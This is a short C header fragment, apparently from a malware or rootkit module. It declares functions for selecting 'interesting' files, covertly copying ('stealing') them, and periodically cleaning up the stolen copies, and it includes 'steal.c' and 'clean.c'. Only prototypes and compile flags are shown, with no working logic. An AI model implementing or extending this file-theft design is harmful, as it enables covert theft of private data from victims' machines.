#ifdef FILE_STEAL

#if defined FILE_CLEANSE_TIMER && defined CLEAN_STOLEN_FILES
void rmstolens(void);
FILE *opencleanedtimepath(const char *mode);
int getlastclean(void);
void writelastclean(int curtime);
int getlastcleandiff(int curtime);
void cleanstolen(void);
#include "clean.c"
#endif


#define FILENAME_MAXLEN 256

int interesting(const char *path);
int write_copy(const char *old_path, char *new_path, off_t filesize);
char *get_new_path(char *filename);
int steal_file(const char *old_path, char *filename, char *new_path);
void inspect_file(const char *pathname);
#include "steal.c"
#endif